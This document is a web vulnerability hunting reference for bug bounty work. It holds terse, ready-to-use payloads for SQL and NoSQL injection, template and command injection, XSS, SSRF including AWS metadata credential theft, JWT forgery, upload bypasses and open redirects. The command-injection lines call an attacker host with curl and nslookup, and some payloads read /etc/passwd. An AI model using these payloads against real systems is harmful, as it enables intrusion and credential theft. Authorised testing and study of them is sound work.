# Web Vulnerability Hunting Reference

## Table of Contents
1. [OWASP Top 10 2025](#owasp-top-10-2025)
2. [Injection Attacks](#injection-attacks)
3. [Cross-Site Scripting (XSS)](#cross-site-scripting)
4. [SSRF](#ssrf)
5. [IDOR](#idor)
6. [Broken Access Control](#broken-access-control)
7. [Authentication & Session Attacks](#authentication--session-attacks)
8. [CSRF](#csrf)
9. [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
10. [File Upload Vulnerabilities](#file-upload-vulnerabilities)
11. [Open Redirect](#open-redirect)
12. [Race Conditions](#race-conditions)

---

## OWASP Top 10 2025

| Rank | Category | Bug Bounty Focus |
|------|----------|-----------------|
| A01 | Broken Access Control (includes SSRF) | IDOR, privilege escalation, forced browsing |
| A02 | Security Misconfiguration | Default creds, verbose errors, open cloud storage |
| A03 | Software Supply Chain Failures (NEW) | Dependency confusion, compromised packages |
| A04 | Cryptographic Failures | Weak TLS, plaintext secrets, weak hashing |
| A05 | Injection | SQLi, NoSQLi, SSTI, command injection, LDAP |
| A06 | Insecure Design | Threat modeling gaps, missing rate limits |
| A07 | Authentication Failures | Broken login, session fixation, weak passwords |
| A08 | Software/Data Integrity Failures | Unsigned updates, CI/CD tampering |
| A09 | Security Logging & Alerting Failures | Missing audit logs, no alerting |
| A10 | Mishandling of Exceptional Conditions (NEW) | Unhandled errors, crash vectors |

---

## Injection Attacks

### SQL Injection (SQLi)

Detection payloads: `' OR 1=1--`, `" OR 1=1--`, `1' ORDER BY 1--+`, `1' UNION SELECT NULL--+`

Error-based: `' AND 1=CONVERT(int,(SELECT @@version))--`

Time-based blind: `' OR IF(1=1,SLEEP(5),0)--`, `'; WAITFOR DELAY '0:0:5'--`

UNION-based: `' UNION SELECT 1,2,3,4,5--`, `' UNION SELECT NULL,username,password,NULL FROM users--`

sqlmap: `sqlmap -u "https://target.com/page?id=1" --batch --random-agent --level 5 --risk 3`

### NoSQL Injection

MongoDB: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`, `{"username": {"$regex": "^admin"}}`

Parameter pollution: `username[$ne]=&password[$ne]=`

### Server-Side Template Injection (SSTI)

Detection: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`

Jinja2: `{{config}}`, `{{config.items()}}`

### OS Command Injection

Detection: `; id`, `| id`, backtick-id-backtick, `$(id)`, `& id`, `&& id`

Blind OOB: `; curl attacker.com/$(whoami)`, `; nslookup $(whoami).attacker.com`

Filter bypass: `$IFS` (space), `c'a't /etc/passwd`, hex encoding

### XML External Entity (XXE)

Basic: Define ENTITY with SYSTEM "file:///etc/passwd" in DOCTYPE, reference in body.

Blind OOB: Use external DTD on attacker server with nested parameter entities.

Via SVG: Upload SVG with DOCTYPE entity referencing file:/// URI.

Via XLSX/DOCX: Unzip office file, inject XXE in embedded XML files.

---

## Cross-Site Scripting

### Reflected XSS

Basic: `<script>alert(origin)</script>`, `<img src=x onerror=alert(origin)>`, `<svg onload=alert(origin)>`

Filter bypass: case variation, HTML entity encoding, template literal backticks, event handlers

WAF bypass: `top["al"+"ert"](1)`, `window["alert"](1)`, `self["alert"](1)`

### Stored XSS

Test in all user-controlled fields: username, bio, comments, file names, email (in admin views), User-Agent/Referer headers stored in logs.

### DOM-based XSS

Vulnerable sinks: innerHTML, outerHTML, insertAdjacentHTML, eval-like functions, setTimeout/setInterval with string args.

Vulnerable sources: location.hash, location.search, document.referrer, window.name, postMessage data.

### Blind XSS

Inject XSS Hunter payloads in: contact forms, support tickets, User-Agent header, feedback forms, error reporting fields. These render in admin panels.

---

## SSRF

### Basic SSRF

Internal: `http://127.0.0.1`, `http://localhost`, `http://[::1]`, `http://0.0.0.0`

Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), Azure/GCP equivalents.

AWS credential theft: `/latest/meta-data/iam/security-credentials/ROLE_NAME`

### SSRF Bypass

IP obfuscation: decimal `2130706433`, hex `0x7f000001`, octal `017700000001`, short form `127.1`

URL parsing confusion: `attacker.com@127.0.0.1`, `127.0.0.1#@attacker.com`

Protocol smuggling: gopher://, dict://, file:///

DNS rebinding: domain alternating between external and 127.0.0.1

---

## IDOR

### Testing Methodology

Identify references in: URL paths, query params, request body, headers, cookies.

Test: increment IDs, swap UUIDs, decode/modify/re-encode, parameter pollution, swap HTTP methods, test across user roles, add extra parameters.

Use Autorize Burp extension for automated horizontal privilege testing.

---

## Broken Access Control

### Privilege Escalation

Vertical: access admin endpoints with low-priv token, modify role params, use X-Original-URL header.

Path bypass: `/Admin`, `/ADMIN`, `/admin/`, `/admin/.`, `//admin`, `/./admin`, `/%61dmin`

Method bypass: GET blocked but POST/PUT/DELETE may work on same endpoint.

---

## Authentication & Session Attacks

### Password Reset

Host header injection: set Host/X-Forwarded-Host to attacker domain in reset request.

Token issues: predictable tokens, reuse after change, shared across users, no expiration.

### JWT Attacks

1. None algorithm (remove signature)
2. HS256/RS256 confusion (sign with public key)
3. Weak secret: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
4. JKU/X5U header injection (point to attacker JWKS)
5. kid path traversal: `{"kid":"../../../dev/null"}`

### OAuth 2.0

redirect_uri manipulation, authorization code theft via Referer, missing state parameter (CSRF), token leakage in URL fragment.

### MFA Bypass

Skip MFA step (direct endpoint access), response manipulation, OTP brute force, token reuse across accounts, backup code brute force.

---

## CSRF

Basic PoC: auto-submitting hidden form targeting state-changing endpoint.

JSON CSRF: use enctype="text/plain" with crafted input names.

Token bypass: remove token, empty value, reuse other user's token, POST-to-GET, swap from another endpoint.

---

## Business Logic Vulnerabilities

### Common Patterns

**Price manipulation**: intercept checkout, modify price to $0.01 or negative.

**Quantity abuse**: negative quantity (credit), integer overflow (2147483647), decimal (0.001).

**Coupon abuse**: apply multiple times, use after removing qualifying items, stack incompatible, use expired.

**Workflow bypass**: skip steps, jump to confirmation, repeat intermediate steps.

**Feature abuse**: free trial cycling, self-referral, points manipulation, cancellation flow abuse.

---

## File Upload Vulnerabilities

Extension bypass: `.php.jpg`, `.php%00.jpg`, `.pHp`, `.php5`, `.phtml`

Content-Type bypass: change to `image/jpeg`

Magic bytes: prepend `GIF89a;` before PHP code

SVG XSS: SVG with embedded script tag

.htaccess upload: `AddType application/x-httpd-php .jpg`

---

## Open Redirect

Payloads: `?url=//attacker.com`, `\/\/attacker.com`, `target.com@attacker.com`, `target.com.attacker.com`, URL-encoded variants, null byte injection.

---

## Race Conditions

Targets: coupon redemption, money transfer, vote systems, file upload+processing (TOCTOU), duplicate account creation.

Use Burp Turbo Intruder to send simultaneous requests. Look for state changes that shouldn't be possible.
